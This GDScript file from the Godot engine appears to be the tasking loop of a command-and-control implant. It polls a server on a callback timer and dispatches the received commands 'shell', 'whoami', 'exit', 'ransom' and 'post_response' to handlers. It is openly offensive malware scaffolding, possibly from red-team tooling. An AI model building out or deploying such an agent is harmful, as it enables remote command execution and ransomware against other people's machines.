extends Node

var parent
var api

signal whoami
signal exit
signal ransom
signal post_response
signal shell

func _ready():
	parent = $".".get_parent()

	api = parent.get_node("api")

func _on_CallbackTimer_timeout():
	print("_on_CallbackTimer_timeout, adding tasking request to outbound queue")
	# TODO: if not api.checkin_done and we've had X timeout/callbacks - kill agent?
	var cbt = parent.get_node("CallbackTimer")
	
	# TODO: implement command 'sleep' - hook here
	cbt.wait_time = parent.get_node("config").get_callback_wait_time()
	cbt.do_callback = true

	if api.checkin_done:
		api.agent_response(api.get_tasking_payload())

func _on_Agent_tasking(data):

	print("on agent tasking: ", data)

	if data.has("payload") and data.get("payload").has("tasks"):

		for task in data.get("payload").get("tasks"):
			print("task: ", task)

			match task.get("command"):
				"shell":
					emit_signal("shell", task)
				"whoami":
					emit_signal("whoami", task)
				"exit":
					emit_signal("exit", task)
				"ransom":
					emit_signal("ransom", task)
				"post_response":
					emit_signal("post_response", task)
				_:
					print("unknown task... ", task)
